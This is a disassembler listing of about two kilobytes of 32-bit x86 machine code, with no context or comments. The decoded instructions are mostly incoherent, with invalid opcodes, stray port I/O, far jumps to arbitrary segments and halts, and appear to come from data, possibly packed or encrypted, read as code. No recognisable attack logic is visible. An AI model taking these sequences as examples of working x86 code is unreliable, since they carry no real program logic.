  411f85:	pop    es
  411f86:	cwde   
  411f87:	adc    eax,0x50555f66
  411f8c:	arpl   WORD PTR [edi],sp
  411f8e:	mov    dl,al
  411f90:	fmul   QWORD PTR [edx-0x4030e97a]
  411f96:	je     0x411ffc
  411f98:	xchg   esp,eax
  411f99:	sbb    al,0xf7
  411f9b:	and    dl,0xc7
  411f9e:	sub    al,0x32
  411fa0:	adc    DWORD PTR [edi-0x7063ee8c],esi
  411fa6:	stos   BYTE PTR es:[edi],al
  411fa7:	inc    edx
  411fa8:	push   es
  411fa9:	out    dx,eax
  411faa:	cmc    
  411fab:	add    DWORD PTR [ebx-0x5f],edx
  411fae:	mov    esi,esi
  411fb0:	rcr    BYTE PTR [edx-0xb],1
  411fb3:	fisubr DWORD PTR [esi-0x2f684a1]
  411fb9:	pop    edx
  411fba:	cmp    eax,0x5bce3da4
  411fbf:	dec    edi
  411fc0:	rcl    DWORD PTR [edi-0x7dfd1874],1
  411fc6:	xchg   ecx,eax
  411fc7:	bound  ebx,QWORD PTR [ebx+ebx*4+0x78957b61]
  411fce:	pop    edx
  411fcf:	push   esp
  411fd0:	jge    0x411fa4
  411fd2:	pop    esi
  411fd3:	cdq    
  411fd4:	pop    ebx
  411fd5:	sub    dl,BYTE PTR [edi+eiz*8]
  411fd8:	add    eax,0x255af67e
  411fdd:	push   ebx
  411fde:	aad    0xc6
  411fe0:	mov    al,ds:0x7ee7e64e
  411fe5:	inc    al
  411fe7:	and    al,0xb8
  411fe9:	inc    eax
  411fea:	jns    0x412025
  411fec:	pop    eax
  411fed:	(bad)  [ebx+edx*8-0x1604ed83]
  411ff4:	pop    esi
  411ff5:	and    DWORD PTR [edx+0x63],edx
  411ff8:	neg    bl
  411ffa:	loopne 0x41204d
  411ffc:	or     BYTE PTR [ebx-0x60],ah
  411fff:	jmp    0x28b5:0xdce162cb
  412006:	inc    edi
  412007:	xchg   esp,eax
  412008:	or     DWORD PTR [ecx-0x6e],ecx
  41200b:	mov    DWORD PTR [eax+0x77bc407e],0xc12279fd
  412015:	add    BYTE PTR [ecx],dh
  412017:	sbb    ebp,esi
  412019:	imul   DWORD PTR [edx+0x5a]
  41201c:	daa    
  41201d:	fs mov edx,0xd6f8184
  412023:	or     ch,dh
  412025:	pushf  
  412026:	lock fsubr QWORD PTR [edi-0x186ca12d]
  41202d:	or     DWORD PTR [edx+0x4553f89],edi
  412033:	retf   0x9519
  412036:	jmp    0x41203d
  412038:	out    0x3c,al
  41203a:	mov    BYTE PTR [edi-0x4f],bl
  41203d:	stc    
  41203e:	add    DWORD PTR [edx-0x7a3da451],ebp
  412044:	dec    ebx
  412045:	sub    BYTE PTR ds:0xfbde24d8,0xda
  41204c:	rcl    BYTE PTR [ebx],1
  41204e:	mov    ds:0xfbea5b5f,al
  412053:	fisubr WORD PTR [ebx+0x649b1666]
  412059:	push   0xc83ceec7
  41205e:	sti    
  41205f:	das    
  412060:	arpl   dx,ax
  412062:	push   ss
  412063:	(bad)  
  412064:	not    BYTE PTR [ecx+0x73182d8d]
  41206a:	pop    edi
  41206b:	lock loope 0x4120db
  41206e:	adc    dl,BYTE PTR [ecx+0x73]
  412071:	pushf  
  412072:	xchg   BYTE PTR [edx+ebp*2-0x2b34abcd],ch
  412079:	mov    edi,0x2528ac69
  41207e:	test   al,0x3c
  412080:	daa    
  412081:	mov    al,0x19
  412083:	mov    dl,0xe8
  412085:	xchg   DWORD PTR [edi-0x64],ebp
  412088:	push   edi
  412089:	cmp    al,0x46
  41208b:	addr16 dec ebx
  41208d:	es push edx
  41208f:	rcr    BYTE PTR [ebx-0x73],0xb1
  412093:	(bad)  
  412094:	fild   WORD PTR [edi+0x7f]
  412097:	and    DWORD PTR [esi+ebp*4-0x1],ebp
  41209b:	push   edi
  41209c:	aam    0xab
  41209e:	cmp    BYTE PTR [ecx],ch
  4120a0:	push   esp
  4120a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4120a2:	retf   0xf118
  4120a5:	daa    
  4120a6:	mov    ah,0x8d
  4120a8:	test   BYTE PTR [edi+0xf],bl
  4120ab:	lds    esp,FWORD PTR [edx]
  4120ad:	push   ss
  4120ae:	push   cs
  4120af:	test   esi,0xb557c32e
  4120b5:	rol    BYTE PTR [edi+0x4a],0xc6
  4120b9:	(bad)  
  4120ba:	jae    0x4120da
  4120bc:	rol    BYTE PTR [ebp+0x25],0x19
  4120c0:	xchg   edx,eax
  4120c1:	push   cs
  4120c2:	aad    0xd1
  4120c4:	pop    ds
  4120c5:	adc    eax,DWORD PTR [eax-0x6daf3f43]
  4120cb:	sbb    dh,bl
  4120cd:	sub    edi,DWORD PTR [ebx]
  4120cf:	ss and al,0xdb
  4120d2:	jp     0x412124
  4120d4:	cmp    eax,0xe5f6aa56
  4120d9:	inc    esi
  4120da:	xlat   BYTE PTR ds:[ebx]
  4120db:	ss iret 
  4120dd:	mov    DWORD PTR [edi+0x4f],esp
  4120e0:	xchg   esp,eax
  4120e1:	lea    edx,[esi+edi*2-0x70]
  4120e5:	xor    eax,0x7c131ea
  4120ea:	cmp    esp,ecx
  4120ec:	int3   
  4120ed:	sub    cl,BYTE PTR [edi-0x1f]
  4120f0:	out    0xb3,eax
  4120f2:	lea    edi,[edx+0x5e]
  4120f5:	not    DWORD PTR [edi]
  4120f7:	cwde   
  4120f8:	cmp    dl,BYTE PTR [ebx+ecx*8-0x3202c95f]
  4120ff:	sub    ebx,DWORD PTR [ecx]
  412101:	loopne 0x4120c4
  412103:	dec    esp
  412104:	add    DWORD PTR [edx],esi
  412106:	push   ebx
  412107:	cli    
  412108:	test   ch,dl
  41210a:	scas   al,BYTE PTR es:[edi]
  41210b:	adc    al,dh
  41210d:	cmp    DWORD PTR [ecx-0x1ffb4aab],ebp
  412113:	dec    esi
  412114:	push   es
  412115:	xchg   DWORD PTR [edi-0x689b9739],esi
  41211b:	add    BYTE PTR [ebp+0x44],0x9
  41211f:	call   0x716d:0x70257735
  412126:	in     eax,0xc8
  412128:	sub    BYTE PTR [esi],ch
  41212a:	clc    
  41212b:	test   al,0x1a
  41212d:	stos   DWORD PTR es:[edi],eax
  41212e:	fucomip st,st(4)
  412130:	cli    
  412131:	xor    eax,0xacaa166f
  412136:	hlt    
  412137:	sbb    DWORD PTR [edi+0x15113dc7],edx
  41213d:	cmp    DWORD PTR [esi-0x2e2bc394],0xe2011d12
  412147:	in     al,0x2b
  412149:	and    esp,DWORD PTR [edx-0xe207c2f]
  41214f:	mov    ebp,DWORD PTR [edx-0x2c]
  412152:	(bad)
  412156:	fldenv [ebp+0x3fe259c1]
  41215c:	in     al,0x67
  41215e:	ja     0x41215b
  412160:	scas   eax,DWORD PTR es:[edi]
  412161:	adc    al,BYTE PTR [esi]
  412163:	mov    ah,0x4f
  412165:	out    0xca,al
  412167:	repz add eax,0x44cf0bec
  41216d:	mov    dl,0x29
  41216f:	xor    ecx,DWORD PTR [esi+0x1b]
  412172:	aaa    
  412173:	aad    0x23
  412175:	ins    BYTE PTR es:[edi],dx
  412176:	and    ch,bl
  412178:	jns    0x41215d
  41217a:	imul   eax,esp,0xffffff9a
  41217d:	mov    BYTE PTR [ebx-0x5e],ch
  412180:	imul   ebp,DWORD PTR [ecx-0x40],0x16f9231d
  412187:	enter  0x109,0xa2
  41218b:	xor    BYTE PTR [esi-0x318b1b04],dh
  412191:	in     al,dx
  412192:	ret    0x46f6
  412195:	retf   0x1f84
  412198:	jmp    0x7aec3c57
  41219d:	fisttp QWORD PTR ds:0xc3e3d08e
  4121a3:	(bad)  
  4121a4:	or     eax,0xb8070dc2
  4121a9:	hlt    
  4121aa:	repnz and al,0x4f
  4121ad:	pop    edi
  4121ae:	xchg   esp,eax
  4121af:	mov    al,ds:0x78674fde
  4121b4:	xor    eax,0x2e172977
  4121b9:	out    0xe,al
  4121bb:	ins    BYTE PTR es:[edi],dx
  4121bc:	adc    DWORD PTR ds:0xc9b842a2,esi
  4121c2:	sti    
  4121c3:	std    
  4121c4:	cmp    eax,0xb97e5cf1
  4121c9:	sbb    esp,DWORD PTR [edi-0x73]
  4121cc:	pop    edx
  4121cd:	lea    esp,[edx-0x7]
  4121d0:	xlat   BYTE PTR ds:[ebx]
  4121d1:	imul   ebx,ecx,0x59
  4121d4:	xchg   ch,cl
  4121d6:	hlt    
  4121d7:	repnz (bad) 
  4121da:	loop   0x41218c
  4121dc:	cmp    dh,BYTE PTR [eax-0x3e]
  4121df:	sub    eax,0x5b2a9c6e
  4121e4:	fwait
  4121e5:	js     0x412172
  4121e7:	pop    ecx
  4121e8:	idiv   DWORD PTR [edx+0xfcc8fac]
  4121ee:	pop    ebp
  4121ef:	adc    al,0x32
  4121f1:	add    DWORD PTR [edi-0x33579cc5],0x63460c24
  4121fb:	mov    WORD PTR ds:0x707649c3,ds
  412201:	je     0x412263
  412203:	popf   
  412204:	push   ss
  412205:	inc    ebx
  412206:	pusha  
  412207:	in     eax,dx
  412208:	mov    al,0xb5
  41220a:	sub    DWORD PTR [ecx],esp
  41220c:	jae    0x412278
  41220e:	push   ss
  41220f:	outs   dx,DWORD PTR ds:[esi]
  412210:	adc    cl,BYTE PTR ds:0x4d9a998
  412216:	and    eax,DWORD PTR [eax-0x1ebd21b1]
  41221c:	sahf   
  41221d:	rcr    BYTE PTR fs:[eax],1
  412220:	sub    eax,0x6b1e2726
  412225:	and    eax,0xe8d6757b
  41222a:	mov    ds:0xd7da394,eax
  41222f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412230:	and    ebp,edx
  412232:	repz sbb ebp,edx
  412235:	ja     0x4121e5
  412237:	and    eax,0x595f4f55
  41223c:	dec    ebx
  41223d:	mov    ds:0x358d9a3a,al
  412242:	lods   al,BYTE PTR ds:[esi]
  412243:	mov    al,ds:0x71145808
  412248:	fbstp  TBYTE PTR [esi]
  41224a:	xchg   edi,eax
  41224b:	fwait
  41224c:	ss push cs
  41224e:	test   DWORD PTR [edi+0x4bf394a9],edi
  412254:	or     eax,0xd5cf7062
  412259:	xlat   BYTE PTR ds:[ebx]
  41225a:	xchg   edi,eax
  41225b:	jbe    0x4121df
  41225d:	in     eax,dx
  41225e:	xchg   DWORD PTR [edx],ebx
  412260:	shr    DWORD PTR ds:0xf679c0d3,0x82
  412267:	mov    ebp,0x30903e0e
  41226c:	cmp    bh,0xa1
  41226f:	jl     0x412230
  412271:	dec    eax
  412272:	sub    esp,edx
  412274:	or     esi,DWORD PTR [ebx]
  412276:	dec    ebp
  412277:	jecxz  0x41223c
  412279:	shr    DWORD PTR [edx+0x62],1
  41227c:	ins    DWORD PTR es:[edi],dx
  41227d:	dec    esp
  41227e:	mov    ds:0xa5700f73,eax
  412283:	jecxz  0x4122e1
  412285:	mov    esp,0x40c09121
  41228a:	std    
  41228b:	cmp    eax,0x425240be
  412290:	fstp   QWORD PTR [eax]
  412292:	or     esi,DWORD PTR [eax+0x32]
  412295:	adc    DWORD PTR ds:0xd589160,esp
  41229b:	push   ebp
  41229c:	or     DWORD PTR [eax+0x236949d8],0x6255fab5
  4122a6:	jge    0x412281
  4122a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4122a9:	mov    al,ds:0x18d9f3d8
  4122ae:	lea    esi,[ecx-0x27281c4]
  4122b4:	loope  0x4122b3
  4122b6:	(bad)  
  4122b8:	dec    ebp
  4122b9:	mov    eax,ds:0x47147ace
  4122be:	xor    DWORD PTR [esi+0x19],esp
  4122c1:	sub    ecx,DWORD PTR [ecx]
  4122c3:	dec    esi
  4122c4:	ret    0x501b
  4122c7:	popa   
  4122c8:	sub    eax,0xfa7cd4f1
  4122cd:	cmp    eax,0x288add6
  4122d2:	sub    BYTE PTR [edi-0x6c],ah
  4122d5:	sbb    DWORD PTR [edx-0x1727c70b],ecx
  4122db:	add    al,0x51
  4122dd:	mov    bh,0x4c
  4122df:	xor    bl,cl
  4122e1:	xchg   esp,eax
  4122e2:	call   FWORD PTR [ebx+0x3b0c4dde]
  4122e8:	int    0x83
  4122ea:	mov    dl,0x2d
  4122ec:	mov    dl,0x8d
  4122ee:	repz mov ?,WORD PTR [esi+0xbefea5d]
  4122f5:	imul   eax
  4122f7:	sub    eax,0x39ec5ab8
  4122fc:	jae    0x4122b4
  4122fe:	xchg   edx,eax
  4122ff:	ss push ebx
  412301:	ret    0xcd8b
  412304:	mov    cl,0xaa
  412306:	push   ebp
  412307:	adc    esp,eax
  412309:	cmp    cl,ch
  41230b:	inc    ebx
  41230c:	hlt    
  41230d:	add    ecx,eax
  41230f:	in     eax,dx
  412310:	jg     0x412292
  412312:	cs sub al,0x13
  412315:	pop    ebx
  412316:	fwait
  412317:	nop
  412318:	fdivp  st(3),st
  41231a:	push   edx
  41231b:	adc    ecx,esp
  41231d:	mov    bh,0x2d
  41231f:	out    dx,eax
  412320:	sub    DWORD PTR [edi+0x38],edi
  412323:	in     al,dx
  412324:	xchg   esp,eax
  412325:	mov    WORD PTR [esp+eax*8],fs
  412328:	retf   0x82a7
  41232b:	pop    edi
  41232c:	pop    ecx
  41232d:	xchg   BYTE PTR [edx+0x24d2c300],dh
  412333:	dec    esp
  412334:	test   eax,0xa3978711
  412339:	inc    esi
  41233a:	(bad)  
  41233b:	call   0x4071717b
  412340:	ins    DWORD PTR es:[edi],dx
  412341:	aaa    
  412342:	rcl    DWORD PTR [ebx-0x39],cl
  412345:	(bad)  
  412346:	push   edi
  412347:	fadd   st(6),st
  412349:	xlat   BYTE PTR ds:[ebx]
  41234a:	sub    esi,DWORD PTR [ebx]
  41234c:	sbb    DWORD PTR [edi],eax
  41234e:	sbb    al,0x7a
  412350:	adc    DWORD PTR [edx+0xc],ecx
  412353:	push   ebp
  412354:	(bad)  
  412355:	ret    
  412356:	test   eax,0x4222983
  41235b:	into   
  41235c:	es jo  0x412340
  41235f:	imul   edi,DWORD PTR [ebp+0xf],0x40
  412363:	jg     0x4123b1
  412365:	inc    ebx
  412366:	repz rol DWORD PTR [esi+edx*2],1
  41236a:	jmp    0x893c:0xcd864b75
  412371:	imul   edi,DWORD PTR [esi],0x5d3b240c
  412377:	stos   BYTE PTR es:[edi],al
  412378:	sbb    esp,DWORD PTR [edx+esi*8+0x7d56912a]
  41237f:	jne    0x412374
  412381:	adc    BYTE PTR [ebp+0x117cf658],ch
  412387:	lahf   
  412388:	sub    DWORD PTR [esi-0x40a75776],0x1c
  41238f:	call   0xb55a:0xf34e0361
  412396:	loope  0x412327
  412398:	into   
  412399:	ret    0x5cc8
  41239c:	or     DWORD PTR [esi-0x21],edx
  41239f:	ins    DWORD PTR es:[edi],dx
  4123a0:	mov    es,WORD PTR [ecx+eiz*8-0x1b]
  4123a4:	and    eax,DWORD PTR [eax]
  4123a6:	adc    al,0xee
  4123a8:	sbb    al,0x93
  4123aa:	aam    0xd4
  4123ac:	aad    0x87
  4123ae:	adc    DWORD PTR ds:0x63889a99,ecx
  4123b4:	cs mov bl,0xb3
  4123b7:	pop    es
  4123b8:	jmp    0x65ec477
  4123bd:	retf   0x290b
  4123c0:	mul    dl
  4123c2:	stos   BYTE PTR es:[edi],al
  4123c3:	mov    DWORD PTR [edi-0x3da5658],ebp
  4123c9:	jl     0x41242d
  4123cb:	repz test BYTE PTR [eax-0x3a2ec3e],ah
  4123d2:	or     esi,ecx
  4123d4:	mov    eax,0x5735873d
  4123d9:	dec    edi
  4123da:	jmp    0x790b:0x534982b6
  4123e1:	xchg   edx,eax
  4123e2:	popa   
  4123e3:	jnp    0x4123d0
  4123e5:	push   esp
  4123e6:	jge    0x4123cf
  4123e8:	jb     0x4123c9
  4123ea:	pop    ds
  4123eb:	pop    ecx
  4123ec:	sub    al,0xe2
  4123ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4123ef:	js     0x4123df
  4123f1:	mov    edi,0xc741941f
  4123f6:	mov    dl,0xfa
  4123f8:	dec    edx
  4123f9:	in     eax,dx
  4123fa:	mov    DWORD PTR [esi+0x76],esi
  4123fd:	push   cs
  4123fe:	jnp    0x41242c
  412400:	ror    DWORD PTR [edx+0x26],1
  412403:	mov    ch,0x59
  412405:	mov    ds:0x436c49b9,eax
  41240a:	pop    ds
  41240b:	test   DWORD PTR [ebp-0x57],edx
  41240e:	dec    esi
  41240f:	dec    ebp
  412410:	xor    al,0x58
  412412:	adc    ebx,DWORD PTR [esp+ebx*4+0x32]
  412416:	mov    ah,0x71
  412418:	jg     0x4123ed
  41241a:	adc    al,0x22
  41241c:	lock xchg ecx,eax
  41241e:	rcl    ah,0x1b
  412421:	popaw  
  412423:	dec    eax
  412424:	push   es
  412425:	test   dl,bl
  412427:	or     BYTE PTR [ecx+0x789d0f3a],0xc7
  41242e:	popa   
  41242f:	dec    ebx
  412430:	scas   eax,DWORD PTR es:[edi]
  412431:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412432:	push   edx
  412433:	mov    WORD PTR [eax+eax*4+0x6108d32a],cs
  41243a:	div    DWORD PTR [ecx+0x32]
  41243d:	out    dx,al
  41243e:	ds retf 
  412440:	cmp    esi,ebp
  412442:	push   ds
  412443:	push   ax
  412445:	xchg   ecx,eax
  412446:	xchg   DWORD PTR ds:[ebp-0x3bf4f897],esp
  41244d:	mov    ds:0x2bdb838e,eax
  412452:	sbb    al,ah
  412454:	ret    0x1188
  412457:	inc    ecx
  412458:	xchg   ebx,eax
  412459:	jp     0x4123f8
  41245b:	and    al,0x37
  41245d:	and    al,0x82
  41245f:	imul   DWORD PTR [eax+0x44]
  412462:	test   eax,0x1ecda277
  412467:	add    ebx,ecx
  412469:	push   edi
  41246a:	xchg   esp,eax
  41246b:	lds    edi,FWORD PTR [edi-0x10]
  41246e:	mov    DWORD PTR [esi+0x66],edx
  412471:	push   ebp
  412472:	mov    ebp,0x97684a99
  412477:	xor    eax,0x6a43421b
  41247c:	push   ecx
  41247d:	xchg   esp,eax
  41247e:	gs mov esp,0xbbb7fe01
  412484:	je     0x4124c2
  412486:	push   ebx
  412487:	(bad)  
  412488:	pop    edx
  412489:	js     0x412476
  41248b:	inc    eax
  41248c:	mov    ebx,0xb1ac6917
  412491:	xchg   ecx,eax
  412492:	cmp    cl,0x8c
  412495:	and    ah,dh
	...
  412513:	add    BYTE PTR [eax],bh
  412515:	mov    dl,0xeb
  412517:	sub    bl,0xd9
  41251a:	jnp    0x4124d6
  41251c:	imul   ecx,DWORD PTR [edx],0x6
  41251f:	and    DWORD PTR [edi+0x27],ebp
  412522:	or     edi,DWORD PTR [eax]
  412524:	add    ecx,esi
  412526:	add    BYTE PTR [eax],al
  412528:	imul   eax,DWORD PTR [edi],0x0
  41252b:	add    dl,dl
  41252d:	dec    eax
  41252e:	test   BYTE PTR [ecx-0x2e02c81],0x79
  412535:	xchg   esp,eax
  412536:	sbb    DWORD PTR [ebp-0x3875da1a],edi
  41253c:	sub    edx,DWORD PTR [eax-0x53]
  41253f:	(bad)  
  412540:	push   esi
  412541:	ror    DWORD PTR [ecx+0x9],0x9f
  412545:	repz sbb ch,BYTE PTR [ecx+0x67d422ab]
  41254c:	or     ah,BYTE PTR [ecx+0x2218d376]
  412552:	pop    edx
  412553:	push   ebx
  412554:	out    dx,al
  412555:	das    
  412556:	fcmovnbe st,st(7)
  412558:	inc    ebx
  412559:	stos   DWORD PTR es:[edi],eax
  41255a:	not    DWORD PTR [esi]
  41255c:	das    
  41255d:	div    DWORD PTR [eax]
  41255f:	or     BYTE PTR [ebp-0x2d91e622],al
  412565:	ins    BYTE PTR es:[edi],dx
  412566:	test   al,0x32
  412568:	aad    0x61
  41256a:	pop    ebp
  41256b:	mov    edx,0x1c9a5a1a
  412570:	popf   
  412571:	xchg   esi,eax
  412572:	cmc    
  412573:	push   edi
  412574:	in     eax,dx
  412575:	test   BYTE PTR [eax],ah
  412577:	clc    
  412578:	jb     0x4124fc
  41257a:	jge    0x41256a
  41257c:	lods   eax,DWORD PTR ds:[esi]
  41257d:	pop    ds
  41257e:	or     eax,0xf8f9ad0f
  412583:	push   0x5e
  412585:	jecxz  0x4125ad
  412587:	and    al,0x66
  412589:	dec    esp
  41258a:	jmp    0x3863:0x1b4228f5
  412591:	jno    0x412586
  412593:	fwait
  412594:	icebp  
  412595:	rol    DWORD PTR [edx],0xf7
  412598:	daa    
  412599:	(bad)  
  41259a:	mov    edx,0xe7ed51b4
  41259f:	cs push ss
  4125a1:	cli    
  4125a2:	adc    DWORD PTR [eax],edx
  4125a4:	das    
  4125a5:	mov    ebx,0xe14bf394
  4125aa:	mov    DWORD PTR [ebx+0x2d],esi
  4125ad:	jp     0x41258a
  4125af:	les    edi,FWORD PTR [eax+ebp*1+0x29]
  4125b3:	pop    es
  4125b4:	push   esi
  4125b5:	(bad)
  4125ba:	icebp  
  4125bb:	int    0xb5
  4125bd:	stos   DWORD PTR es:[edi],eax
  4125be:	daa    
  4125bf:	test   ebx,ebp
  4125c1:	mov    ch,0x13
  4125c3:	dec    edx
  4125c4:	(bad)  
  4125c5:	icebp  
  4125c6:	imul   ebp,DWORD PTR [edi+0x7fa82eb2],0xc68a577d
  4125d0:	(bad)  
  4125d1:	xchg   esp,eax
  4125d2:	sbb    BYTE PTR [eax-0x29],bl
  4125d5:	xor    DWORD PTR ds:0xf4f028c,ebx
  4125db:	lods   al,BYTE PTR ds:[esi]
  4125dc:	dec    ecx
  4125dd:	pop    es
  4125de:	aam    0x8d
  4125e0:	data16 addr16 loopne 0x41256d
  4125e4:	add    eax,0x9c90de4c
  4125e9:	sub    BYTE PTR [ebp-0x54bcc56a],ah
  4125ef:	pop    edi
  4125f0:	shr    BYTE PTR [eax-0x64],1
  4125f3:	jns    0x412577
  4125f5:	outs   dx,DWORD PTR ds:[esi]
  4125f6:	or     DWORD PTR [ebx-0x14],eax
  4125f9:	ror    DWORD PTR [ebp+0x15bb3a2f],0x3f
  412600:	pop    esi
  412601:	(bad)  
  412602:	scas   eax,DWORD PTR es:[edi]
  412603:	push   ebp
  412604:	call   0x5cb5ecdf
  412609:	push   cs
  41260a:	mov    ah,0x85
  41260c:	pop    es
  41260d:	loop   0x4125ee
  41260f:	add    esp,ebx
  412611:	and    ch,BYTE PTR [ebp-0x47]
  412614:	cs cwde 
  412616:	inc    ebp
  412617:	je     0x4125d5
  412619:	js     0x412689
  41261b:	ds push es
  41261d:	ret    0xbab6
  412620:	mul    DWORD PTR [ecx+0x3e]
  412623:	(bad)  
  412624:	cdq    
  412625:	hlt    
  412626:	pand   mm4,QWORD PTR [ecx]
  412629:	fisub  DWORD PTR [bx+si+0x3b]
  41262d:	pushf  
  41262e:	fcmovu st,st(6)
  412630:	ja     0x41264d
  412632:	(bad)  
  412633:	repnz (bad) 
  412636:	dec    ebx
  412637:	imul   edx,edx,0x8873d8df
  41263d:	gs mov bh,0xb5
  412640:	gs (bad) 
  412642:	aas    
  412643:	aam    0xfd
  412645:	retf   
  412646:	xlat   BYTE PTR ds:[ebx]
  412647:	pushf  
  412648:	lahf   
  412649:	adc    ch,BYTE PTR [eax+eax*1]
  41264c:	and    BYTE PTR [eax+0x21],ah
  41264f:	sbb    dl,bh
  412651:	nop
  412652:	enter  0x2e9b,0xb3
  412656:	dec    edx
  412657:	test   DWORD PTR [eax-0x6acad97a],ebx
  41265d:	xor    DWORD PTR [edi+0xb],ecx
  412660:	popf   
  412661:	in     eax,0xd6
  412663:	sub    DWORD PTR [ebx],edx
  412665:	push   edi
  412666:	lds    ecx,FWORD PTR [ecx-0x3d0f466b]
  41266c:	and    dh,BYTE PTR [ecx+0x17]
  41266f:	xor    edx,ebp
  412671:	ins    BYTE PTR es:[edi],dx
  412672:	les    edi,FWORD PTR [ecx+eax*1-0x4a]
  412676:	imul   edi,DWORD PTR [edi-0x2b],0xfffffff8
  41267a:	and    cl,al
  41267c:	mov    WORD PTR [esi-0x3717fa9a],?
  412682:	pushf  
  412683:	push   0xb54e90e1
  412688:	xor    ecx,DWORD PTR [ecx]
  41268a:	mov    dl,0x63
  41268c:	int    0x15
  41268e:	mov    eax,0x3f4cec24
  412693:	nop
  412694:	add    esp,esp
  412696:	sub    eax,0xf7e9e831
  41269b:	mov    esp,0x6da0937e
  4126a0:	dec    ebp
  4126a1:	ret    
  4126a2:	ds popf 
  4126a4:	jmp    0x4126f3
  4126a6:	or     BYTE PTR [eax],ch
  4126a8:	push   ebx
  4126a9:	leave  
  4126aa:	sub    edx,DWORD PTR [ebp+ebp*2-0x14]
  4126ae:	push   ebx
  4126af:	mov    al,0x7a
  4126b2:	in     eax,0x7d
  4126b4:	js     0x412691
  4126b6:	xchg   ebx,eax
  4126b7:	add    eax,0x2e11a1e4
  4126bc:	rol    BYTE PTR [ecx],cl
  4126be:	gs sbb eax,0xe55333be
  4126c4:	rcr    DWORD PTR [edx+0x4f043d2a],0x1b
  4126cb:	fwait
  4126cc:	mov    WORD PTR [edi],ds
  4126ce:	frstor [edx-0x8]
  4126d1:	and    esi,eax
  4126d3:	jge    0x4126db
  4126d5:	ror    BYTE PTR [edx-0x5a4ff788],cl
  4126db:	lods   eax,DWORD PTR ds:[esi]
  4126dc:	and    cl,BYTE PTR [ebp+0x35e8a684]
  4126e2:	or     BYTE PTR [edx+ecx*8+0x26],bh
  4126e6:	pop    edi
  4126e7:	fmul   QWORD PTR [esp-0x1ce34ca6]
  4126ee:	repz push ds
  4126f0:	in     eax,dx
  4126f1:	jns    0x4126a2
  4126f3:	call   0x1f1c:0xf640b6b
  4126fa:	push   0x65
  4126fc:	xchg   BYTE PTR [ecx-0x7a],al
  4126ff:	fnstsw WORD PTR [eax-0x49cacb08]
  412705:	mov    edi,0xaa6e5049
  41270a:	jae    0x412713
  41270c:	inc    edi
  41270d:	js     0x412781
  41270f:	in     al,dx
  412710:	mov    eax,0xd3768144
  412715:	push   esi
  412716:	adc    al,0x88
  412718:	leave  
  412719:	mov    al,ds:0x2b9940a0
  41271e:	adc    DWORD PTR [edi-0x6f94b987],edx
  412724:	fcmove st,st(0)
  412726:	imul   edx,DWORD PTR [ecx+0x57e2c9a9],0xffffffbf
  41272d:	stos   DWORD PTR es:[edi],eax
  41272e:	mov    ebx,0x7cb12fae
  412733:	mov    ebp,0x3f4a659e
  412738:	call   0x3b5d:0x16d9eee6
  41273f:	xor    esi,DWORD PTR [ecx]
  412741:	hlt    
  412742:	shl    bh,1
  412744:	aaa    
  412745:	into   
  412746:	fldenv [eax]
  412748:	or     ah,0x1c
  41274b:	mov    ebp,0x62f7d01
  412750:	mov    DWORD PTR [esi+eiz*2],ecx
  412753:	mov    ecx,0xd847fbf
  412758:	dec    esi
  412759:	lods   al,BYTE PTR ds:[esi]
  41275a:	pusha  
  41275b:	add    esp,esp
  41275d:	pop    edx
  41275e:	jbe    0x4127af
  412760:	mov    edi,0x758315b0
  412765:	dec    ebx
  412766:	cli    
  412767:	pop    ebp
  412768:	test   DWORD PTR [esi+0x66],edi
  41276b:	mov    dh,0x4e
  41276d:	out    dx,eax
  41276e:	pop    edi
  41276f:	fidiv  DWORD PTR gs:[eax+esi*8]
  412773:	mov    al,0xd1
  412775:	dec    edx
  412776:	mov    es,WORD PTR [ebx+0x24]
  412779:	mov    DWORD PTR [ebx+0x2641b8f5],ecx
  41277f:	sbb    al,0x7a
  412781:	in     al,0x14
  412783:	fdivr  DWORD PTR [edi+0xa6de459]
  412789:	mov    dl,0x1f
  41278b:	or     al,0xd6
  41278d:	mov    bh,BYTE PTR [ebx]
  41278f:	or     esp,edi
  412791:	inc    edx
  412792:	ins    BYTE PTR es:[edi],dx
  412793:	in     eax,dx
  412794:	stos   DWORD PTR es:[edi],eax
  412795:	sbb    ebp,DWORD PTR [esi-0x61]
  412798:	lods   eax,DWORD PTR ds:[esi]
  412799:	push   edx
  41279a:	lock cs mov ebp,0x8e1174e9
  4127a1:	xchg   ebp,esp
  4127a3:	xchg   esi,eax
  4127a4:	retf   
  4127a5:	cdq    
  4127a6:	push   eax
  4127a7:	xchg   ebx,eax
  4127a8:	mov    BYTE PTR [eax-0x406351d],bl
  4127ae:	mov    al,ds:0xf8b245e
  4127b3:	add    eax,0x427a0b0d
  4127b8:	cmp    BYTE PTR [ebx],0x94
  4127bb:	das    
  4127bc:	arpl   si,bx
  4127be:	popa   
  4127bf:	add    esp,DWORD PTR [esi]
  4127c1:	mul    BYTE PTR [ecx-0x695a0a17]
  4127c7:	cld    
  4127c8:	repz test al,0xd5
  4127cb:	in     al,dx
  4127cc:	stos   DWORD PTR es:[edi],eax
  4127cd:	or     al,0x91
  4127cf:	(bad)  
  4127d1:	call   0x9bfa:0xdde8b0ec
  4127d8:	xchg   DWORD PTR [ecx],edi
  4127da:	cmp    eax,0xcd17a15e
  4127df:	popf   
  4127e0:	jnp    0x412780
  4127e2:	into   
  4127e3:	cld    
  4127e4:	cmp    esi,edi
  4127e6:	fdivr  QWORD PTR [edi-0x28]
  4127e9:	xlat   BYTE PTR ds:[ebx]
  4127ea:	xchg   edx,eax
  4127eb:	aaa    
  4127ec:	dec    ebx
  4127ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4127ee:	inc    edx
  4127ef:	mov    ds:0x70747fcc,eax
  4127f4:	shl    BYTE PTR [edx+eax*4],cl
  4127f7:	sbb    DWORD PTR [ecx+0x77a8fc73],esi
  4127fd:	mov    al,0xac
  4127ff:	cwde   
  412800:	mov    DWORD PTR [esi+0x6a],ebx
  412803:	jo     0x412832
  412805:	mov    BYTE PTR [edi+0x62f5aa2c],dh
  41280b:	mov    ebp,0xa28621ff
  412810:	mov    esp,0xe3cb2859
  412815:	or     ebp,ebp
  412817:	mov    bl,BYTE PTR [ecx-0x69]
  41281a:	dec    ebx
  41281b:	cld    
  41281c:	mov    al,0xbc
  41281e:	int    0x11
  412820:	jae    0x412821
